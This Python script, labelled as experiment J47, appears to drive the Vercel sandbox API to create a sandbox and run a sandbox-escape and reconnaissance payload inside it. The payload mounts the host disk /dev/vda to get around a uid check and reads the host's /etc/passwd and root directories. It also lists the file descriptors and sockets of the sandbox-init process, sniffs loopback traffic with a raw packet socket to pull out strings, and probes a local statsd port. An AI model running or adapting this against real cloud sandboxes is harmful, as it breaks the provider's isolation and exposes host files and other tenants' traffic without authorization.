# 实验J47: os.mount 绕过 uid 检查 + sandbox-init fd 连接 + lo 抓包
# 目标: 文件系统级挂载宿主 rootfs; 定位 sandbox-init 的宿主连接; 抓 lo 流量
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=300):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)

NAME = "expj47"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

SCAN = r'''
import socket, re, os, subprocess, time, threading

print("===== [1] os.mount /dev/vda (绕过 uid 检查) =====", flush=True)
os.makedirs("/mnt/vda", exist_ok=True)
try:
    os.mount("/dev/vda", "/mnt/vda", "xfs", os.MS_RDONLY, "nouuid")
    print("os.mount OK!", flush=True)
    print(subprocess.run(["ls", "-la", "/mnt/vda"], capture_output=True, text=True).stdout, flush=True)
    print("=== /mnt/vda/run ===", flush=True)
    print(subprocess.run(["ls", "-la", "/mnt/vda/run"], capture_output=True, text=True).stdout[:2500], flush=True)
    print("=== /mnt/vda/opt ===", flush=True)
    print(subprocess.run(["ls", "-la", "/mnt/vda/opt"], capture_output=True, text=True).stdout[:2500], flush=True)
    print("=== /mnt/vda/volumes ===", flush=True)
    print(subprocess.run(["ls", "-la", "/mnt/vda/volumes"], capture_output=True, text=True).stdout[:2500], flush=True)
    print("=== /mnt/vda/etc/passwd ===", flush=True)
    print(open("/mnt/vda/etc/passwd").read()[:1200], flush=True)
    print("=== /mnt/vda/root ===", flush=True)
    print(subprocess.run(["ls", "-la", "/mnt/vda/root"], capture_output=True, text=True).stdout[:1200], flush=True)
except Exception as e:
    print("os.mount FAIL: %r" % e, flush=True)

print("===== [2] sandbox-init fd 与连接 =====", flush=True)
for fd in sorted(os.listdir("/proc/1/fd"), key=int):
    try:
        t = os.readlink("/proc/1/fd/" + fd)
        print("fd %-3s -> %s" % (fd, t), flush=True)
    except Exception as e:
        print("fd %s ERR %s" % (fd, e), flush=True)

print("===== [3] sandbox-init 网络连接 (从 fd 推断) =====", flush=True)
# 读 /proc/net/unix 找 init.sock 相关的
for ln in open("/proc/net/unix"):
    if "vercel" in ln or "cell" in ln or "containerd" in ln:
        print(ln.strip(), flush=True)
# tcp/tcp6 全部状态
for pf in ["tcp", "tcp6"]:
    for ln in open("/proc/net/%s" % pf).read().splitlines()[1:]:
        p = ln.split()
        if len(p) >= 4 and p[3] != "0A":
            print("%s: %s" % (pf, ln.strip()), flush=True)

print("===== [4] lo 抓包 (60s) =====", flush=True)
stop = threading.Event()
frames = []
def sniffer():
    try:
        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
        s.bind(("lo", 0))
        s.settimeout(1.0)
        t0 = time.time()
        while not stop.is_set() and time.time() - t0 < 60:
            try:
                data, addr = s.recvfrom(65535)
                frames.append(data)
            except socket.timeout:
                continue
        s.close()
    except Exception as e:
        print("sniffer ERR: %s" % e, flush=True)
th = threading.Thread(target=sniffer)
th.start()
time.sleep(60)
stop.set()
th.join(timeout=10)
print("lo frames: %d" % len(frames), flush=True)

# 分析 lo 流量: 提取 UDP/TCP payload 的 ASCII
strs = set()
for f in frames:
    if len(f) < 42:
        continue
    # loopback: ETH_P_IP
    eth_type = int.from_bytes(f[12:14], "big")
    off = 14
    if eth_type != 0x0800:
        continue
    ihl = (f[off] & 0x0F) * 4
    proto = f[off + 9]
    if proto == 17:  # UDP
        payload = f[off+ihl+8+8:]
    elif proto == 6:  # TCP
        payload = f[off+ihl+20+4+12:]
    else:
        payload = f[off+ihl:]
    for m in re.finditer(rb"[\x20-\x7e]{4,}", payload):
        strs.add(m.group(0))
print("unique strings on lo:", len(strs), flush=True)
for s in sorted(strs)[:60]:
    print("  LO: %r" % s.decode('latin1'), flush=True)

print("===== [5] 8125 statsd 探测 =====", flush=True)
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(2)
    s.sendto(b"probe.test:1|c", ("127.0.0.1", 8125))
    try:
        d, _ = s.recvfrom(1024)
        print("statsd resp: %r" % d, flush=True)
    except socket.timeout:
        print("statsd no response (normal for statsd)", flush=True)
    s.close()
except Exception as e:
    print("statsd probe ERR: %s" % e, flush=True)
'''
run_cmd(sid, SCAN, "os-mount-fd-lo-sniff", wait=True, timeout=300000)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
